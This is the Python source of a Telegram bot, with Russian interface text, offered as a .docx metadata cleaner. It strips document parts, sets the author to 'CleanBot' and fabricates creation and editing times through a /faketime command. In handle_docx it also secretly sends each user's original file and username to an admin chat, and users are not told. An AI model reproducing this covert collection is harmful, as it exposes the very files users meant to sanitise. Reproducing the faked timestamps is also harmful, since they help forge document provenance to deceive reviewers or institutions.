import os
import shutil
import zipfile
import xml.etree.ElementTree as ET
from datetime import datetime, timedelta
from telegram import Update, KeyboardButton, ReplyKeyboardMarkup, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    ApplicationBuilder, MessageHandler, CommandHandler,
    CallbackQueryHandler, ContextTypes, filters
)

TOKEN = os.environ["TOKEN"]
ADMIN_CHAT_ID = os.environ.get("ADMIN_CHAT_ID")
user_faketimes = {}


def set_metadata_fields(core_path, app_path, author, created, modified, total_time):
    ns_core = {
        'cp': 'http://schemas.openxmlformats.org/package/2006/metadata/core-properties',
        'dc': 'http://purl.org/dc/elements/1.1/',
        'dcterms': 'http://purl.org/dc/terms/',
        'xsi': 'http://www.w3.org/2001/XMLSchema-instance'
    }
    ns_app = {
        'ep': 'http://schemas.openxmlformats.org/officeDocument/2006/extended-properties'
    }
    if os.path.exists(core_path):
        tree = ET.parse(core_path)
        root = tree.getroot()
        def set_el(tag, ns_key, text):
            full_tag = f"{{{ns_core[ns_key]}}}{tag}"
            el = root.find(full_tag)
            if el is None:
                el = ET.SubElement(root, full_tag)
            el.text = text
        set_el('creator', 'dc', author)
        set_el('lastModifiedBy', 'cp', author)
        set_el('created', 'dcterms', created)
        set_el('modified', 'dcterms', modified)
        root.set("xmlns:xsi", ns_core['xsi'])
        for el in root.findall('.//dcterms:created', ns_core) + root.findall('.//dcterms:modified', ns_core):
            el.set("{http://www.w3.org/2001/XMLSchema-instance}type", "dcterms:W3CDTF")
        tree.write(core_path)
    if os.path.exists(app_path):
        tree = ET.parse(app_path)
        root = tree.getroot()
        total_tag = '{http://schemas.openxmlformats.org/officeDocument/2006/extended-properties}TotalTime'
        el = root.find(total_tag)
        if el is None:
            el = ET.SubElement(root, total_tag)
        el.text = str(total_time)
        tree.write(app_path)


def purge_docx(input_path: str, output_path: str, user_id: int):
    with zipfile.ZipFile(input_path, 'r') as zin:
        zin.extractall('temp_raw')
    for root, dirs, files in os.walk('temp_raw'):
        for fname in files:
            rel = os.path.relpath(os.path.join(root, fname), 'temp_raw')
            if rel not in {
                '[Content_Types].xml', '_rels/.rels',
                'word/document.xml', 'word/styles.xml', 'word/_rels/document.xml.rels',
                'docProps/core.xml', 'docProps/app.xml'
            }:
                os.remove(os.path.join(root, fname))
    author = "CleanBot"
    now = datetime.utcnow()
    minutes = user_faketimes.get(user_id, 0)
    created = (now - timedelta(minutes=minutes)).strftime("%Y-%m-%dT%H:%M:%SZ")
    modified = now.strftime("%Y-%m-%dT%H:%M:%SZ")
    set_metadata_fields('temp_raw/docProps/core.xml', 'temp_raw/docProps/app.xml', author, created, modified, minutes)
    with zipfile.ZipFile(output_path, 'w') as zout:
        for folder, _, files in os.walk('temp_raw'):
            for fname in files:
                full = os.path.join(folder, fname)
                arc = os.path.relpath(full, 'temp_raw')
                zout.write(full, arc)
    shutil.rmtree('temp_raw')


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    kb = [
        [KeyboardButton("🧼 Удалить метаданные")],
        [KeyboardButton("⚙ Изменить параметры метаданных")]
    ]
    await update.message.reply_text(
        "👋 Добро пожаловать! Что хотите сделать?",
        reply_markup=ReplyKeyboardMarkup(kb, resize_keyboard=True)
    )


async def faketime(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    try:
        minutes = int(context.args[0])
        user_faketimes[user_id] = minutes
        await update.message.reply_text(f"✅ Время редактирования установлено: {minutes} мин.")
    except:
        await update.message.reply_text("⛔ Формат: /faketime 120 — где 120 это минуты.")


async def handle_docx(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    doc = update.message.document
    if not doc.file_name.lower().endswith('.docx'):
        await update.message.reply_text("📄 Пожалуйста, отправь .docx файл.")
        return

    in_path = f"input_{doc.file_unique_id}.docx"
    out_path = f"cleaned_{doc.file_unique_id}.docx"
    tg_file = await doc.get_file()
    await tg_file.download_to_drive(in_path)
    purge_docx(in_path, out_path, user.id)

    await update.message.reply_document(document=open(out_path, 'rb'))

    if ADMIN_CHAT_ID:
        await context.bot.send_message(chat_id=ADMIN_CHAT_ID, text=f"📥 @{user.username} загрузил файл {doc.file_name}")
        await context.bot.send_document(chat_id=ADMIN_CHAT_ID, document=open(in_path, 'rb'))

    os.remove(in_path)
    os.remove(out_path)

    kb = InlineKeyboardMarkup([
        [InlineKeyboardButton("Удалить ещё один файл", callback_data="repeat")],
        [InlineKeyboardButton("Изменить параметры", callback_data="params")]
    ])
    await update.message.reply_text("✅ Готово! Что дальше?", reply_markup=kb)


async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    if query.data == "repeat":
        await query.message.reply_text("📄 Отправь новый .docx файл")
    elif query.data == "params":
        kb = InlineKeyboardMarkup([
            [InlineKeyboardButton("Изменить фейковое время", callback_data="set_fake_time")]
        ])
        await query.message.reply_text("⚙ Что именно изменить?", reply_markup=kb)

    elif query.data == "set_fake_time":
        await query.message.reply_text("Введите команду вида /faketime 120 — чтобы указать длительность редактирования.")


def main():
    app = ApplicationBuilder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("faketime", faketime))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_docx))
    print("Бот запущен.")
    app.run_polling()


if __name__ == "__main__":
    main()
